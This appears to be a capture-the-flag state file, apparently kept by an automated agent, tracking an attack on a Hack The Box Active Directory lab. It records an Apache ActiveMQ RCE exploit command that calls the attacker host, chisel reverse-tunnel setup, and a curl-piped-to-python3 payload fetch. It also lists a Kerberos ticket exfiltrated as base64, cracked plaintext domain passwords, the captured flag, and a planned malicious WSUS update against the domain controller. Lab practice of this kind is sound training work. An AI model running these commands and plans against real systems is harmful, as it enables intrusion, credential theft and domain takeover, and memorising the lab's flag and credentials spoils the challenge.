# CTF State — HTB OpenAD

**Target:** 10.129.1.8 (was 10.129.230.70 — reset)  
**Domain:** king.htb / KING.HTB  
**Status:** User flag captured. Root flag pending.

---

## Phase: AD EXPLOITATION / WSUS ATTACK

### What we have
- **RCE as `svc_mq@king.htb`** via CVE-2023-46604 (Apache ActiveMQ OpenWire RCE, port 61616)
  - Exploit: `python3 /home/takashi/Pentester/AI_Teams/ctfPlayer/HTB/OpenAD/exploit.py 10.129.1.8 61616 "http://10.10.14.2:8080/<file>.xml"`
  - Spring XML beans served from `/home/takashi/Pentester/AI_Teams/ctfPlayer/HTB/OpenAD/` via HTTP on port 8080
  - HTTP server log: `/tmp/http8080.log`
- **User flag:** `dc5c911e680e8ebd911626a2b8fe09c2` (at `/home/svc_mq@king.htb/user.txt`)

### Target Environment
- OS: Ubuntu 20.04 (hostname: `mq`)
- Internal IP: 172.16.1.100/16
- Domain-joined Linux member of king.htb AD domain
- SSSD handles domain authentication (sssd running as root)
- **anne** (uid=1000, local user, `/home/anne`) — has `.sudo_as_admin_successful` → CAN sudo → not yet exploited
- **svc_mq** — domain user, uid=1600801117, runs ActiveMQ as svc_mq@king.htb
- svc_mq TGT: `/tmp/krb5cc_1600801117_Qxs0zd` (re-confirmed this session, exfiltrated as base64)

### Windows DC
- **openAD.king.htb** at 172.16.1.1
- Open ports from mq: 80, 8530 (WSUS!), 8531, 5985 (WinRM), 135, 593, 9389, 464
- DC ports via SOCKS tunnel (some slow): 445, 389, 636, 53, 88, 3268, 3269

### SQL Machine (172.16.1.101)
- **OFFLINE** since machine reset — all ports closed, no ping response

---

## Pivot Status — ACTIVE
- **Reverse chisel tunnel:** target connects OUT to attacker:7777
  - Start attacker server: `/home/takashi/.local/bin/chisel server --port 7777 --reverse > /dev/null 2>&1 &`
  - Trigger target client: `python3 exploit.py 10.129.1.8 61616 "http://10.10.14.2:8080/pivot_rev.xml"`
  - Verify: `ss -tlnp | grep 1080` → should show `127.0.0.1:1080`
  - Confirm working: `proxychains4 -f /tmp/pc_chisel.conf curl -s http://172.16.1.1/` returns HTML
- **Proxychains config:** `/tmp/pc_chisel.conf` → socks5 127.0.0.1 1080
- **NOTE:** Port 7777 on attacker IS reachable from target (confirmed). Port 18888 (old forward tunnel) is blocked by HTB firewall.
- **NOTE:** chisel v1.7.3 crashes with `--reverse --socks5` flags; use ONLY `--reverse` (no --socks5). Works fine.

---

## Credentials Found
| User | Password | Source | Notes |
|------|----------|--------|-------|
| activemq system | manager | /opt/activemq/conf/credentials.properties | |
| activemq guest | password | credentials.properties | |
| jetty admin | admin | jetty-realm.properties | Web console |
| jetty user | user | jetty-realm.properties | |
| activemq admin | admin | users.properties | |
| svc_laps@KING.HTB | 16bmxkingm@ | Kerberoast crack (john, rockyou) | RC4 TGS |
| svc_sql@KING.HTB | r%msnCet4EA5#J | Kerberoast crack (same as LAPS password!) | RC4 TGS |

## Active Directory — Key Findings

### BloodHound Collection: `_20260401133945_*.json` (in OpenAD dir)
- 3 computers: mq.king.htb, sql.king.htb (offline), openAD.king.htb (DC)
- 18 users, 58 groups

### AD Attack Chain (WSUS)
1. **svc_sql** has `GenericWrite` + `AddSelf` → `WSUS Administrators` group
   - **DONE:** svc_sql added to WSUS Administrators via ldapmodify this session
2. **svc_wsus** (in WSUS Administrators) has constrained delegation → `svc_sql`
   - UAC: 66048 (NO protocol transition/TRUSTED_TO_AUTH_FOR_DELEGATION)
3. **WSUS Service** is installed on DC at http://172.16.1.1:8530 (confirmed accessible from mq)
   - Shares on DC: `WsusContent`, `UpdateServicesPackages`, `WSUSTemp`
   - `wuagent.exe` (833KB) present in WsusContent

### WSUS API Status
- `http://172.16.1.1:8530/ApiRemoting30/WebService.asmx` — returns HTTP 500 with SOAP fault
  - NTLM auth SUCCEEDS (no 401/403) — svc_sql added to WSUS Administrators group
  - Error: "Server did not recognize the value of HTTP Header SOAPAction: [action]"
  - **Root cause:** SOAPAction format is wrong for this WCF-style endpoint
  - **WSDL not available** (returns HTML 500 for ?wsdl queries)
  - `ApiRemoting30/` GET returns HTTP 200 empty body
- `http://172.16.1.1:8530/ClientWebService/client.asmx?wsdl` — HTTP 200 (client-facing, not admin)
- `http://172.16.1.1:8530/SimpleAuthWebService/SimpleAuth.asmx?wsdl` — HTTP 200 (auth cookie service)
- `WsusContent` share: svc_sql has read access but NOT write access (Access Denied on write)

### Other ACL Findings
- `svc_wsus` ACEs: Account Operators has GenericAll; Key Admins/Enterprise Key Admins have AddKeyCredentialLink
- We are NOT in Account Operators, Key Admins, or Enterprise Key Admins
- `svc_sql` can add itself to WSUS Administrators (done) but WSUS API format issue blocks exploitation
- `LAPS-ReadOnly` group: can read LAPS for sql.king.htb only (SQL offline)
- No DCSync rights, no SYSVOL write, no WinRM access with current creds
- No AS-REP roastable users found

### Available Tools on mq
- `/usr/bin/python3` — Python3 available
- `/usr/bin/ldapsearch` — ldapsearch available
- No impacket, no kinit/klist, no curl with GSSAPI

---

## Failed Privesc Paths (from mq)
1. PwnKit (CVE-2021-4034) — polkit PATCHED
2. SSH password spray (anne) — failed
3. LDAP GSSAPI — SSSD plugin conflict
4. LXD — svc_mq not in lxd group
5. sudo -l as svc_mq — no sudo rights
6. SYSVOL/NETLOGON write — Access Denied for svc_laps and svc_sql
7. WsusContent write — Access Denied for svc_sql (need svc_wsus)
8. DCSync — no replication rights
9. Password spray on domain users — nothing found
10. SQL machine pivot — machine is OFFLINE

---

## Next Steps (Priority Order)

### Option 1: Fix WSUS API SOAP format (HIGH PRIORITY)
The NTLM auth works, SOAPAction format is wrong. Need to find the correct format.
- The endpoint is at `/ApiRemoting30/WebService.asmx`
- Try running exploit FROM mq machine using Python3 with NTLM (no GSSAPI needed if NTLM works from mq)
- Upload a Python WSUS exploit to mq via HTTP server and run via Spring XML
- Use impacket's NTLM implementation for auth (upload impacket wheel to mq)
- SharpWSUS calls: GetComputerTargets → CreateUpdatePackage → ApproveUpdate for DC

### Option 2: Get svc_wsus credentials
svc_wsus is pre-configured WSUS admin and can write to WsusContent share.
- Password spray svc_wsus: try wsus123, Wsus2023, King@wsus, etc.
- If we get svc_wsus creds: write malicious `wuagent.exe` to WsusContent (alternative to API)
- Constrained delegation from svc_wsus → svc_sql (no protocol transition, limited use)

### Option 3: Run WSUS attack FROM mq (bypass SOCKS tunnel issues)
- Upload Python WSUS exploit to mq HTTP server
- Run it via Spring XML using `curl http://10.10.14.2:8080/wsus_exploit.py | python3`
- From mq, WSUS port 8530 IS directly accessible (no SOCKS issues)
- Use impacket wheels (already in OpenAD/wheels/) for NTLM auth
- svc_sql OR svc_mq (via TGT at /tmp/krb5cc_*) can authenticate

### Option 4: Bronze Bit / Constrained Delegation abuse
- svc_wsus has `msDS-AllowedToDelegateTo: svc_sql` (no protocol transition)
- If we get svc_wsus TGT + find a way to do S4U2Self → S4U2Proxy (limited without protocol transition)

---

## Important Files on Target
```
/opt/activemq/conf/credentials.properties    — plaintext broker creds
/tmp/krb5cc_1600801117_Qxs0zd               — svc_mq Kerberos TGT
/tmp/chisel                                  — chisel binary (may need re-upload)
```

## Spring XML Files Available
```
exploit.py              — CVE-2023-46604 exploit (use with new IP 10.129.1.8)
pivot_rev.xml           — reverse chisel: target connects to attacker:7777 R:socks
debug_chisel.xml        — tests if 7777 reachable + starts chisel client
pivot_chisel.xml        — forward chisel (BLOCKED by HTB firewall - DO NOT USE)
check_sql.xml           — check SQL machine ports from mq
scan_subnet.xml         — subnet scan from mq
scan_dc_ports.xml       — DC port scan from mq
wsus_check.xml          — test WSUS from mq with kinit (kinit not installed on mq)
get_tgt.xml             — exfiltrate svc_mq TGT as base64
```

## BloodHound Data Files
```
_20260401133945_computers.json
_20260401133945_users.json
_20260401133945_groups.json
_20260401133945_gpos.json
_20260401133945_domains.json
_20260401133945_ous.json
_20260401133945_containers.json
```

## HTTP Server
Must be running to serve XML payloads:
```bash
cd /home/takashi/Pentester/AI_Teams/ctfPlayer/HTB/OpenAD
ps aux | grep "http.server 8080"  # check if running
python3 -m http.server 8080 >> /tmp/http8080.log 2>&1 &  # start if needed
```

## Session Notes
- Attacker VPN IP: 10.10.14.2
- chisel v1.7.3 server crash: use `--reverse` flag ONLY (not `--socks5`)
- Machine reset changes TGT ccache filename — check `/tmp/krb5cc_*` after reset
- requests_ntlm installed: `pip3 install requests_ntlm --break-system-packages`
- requests_kerberos installed: `pip3 install requests-kerberos --break-system-packages`
- krb5.conf for king.htb: `/tmp/krb5_king.conf`
- svc_sql ccache: `/home/takashi/Pentester/AI_Teams/ctfPlayer/HTB/OpenAD/svc_sql.ccache`
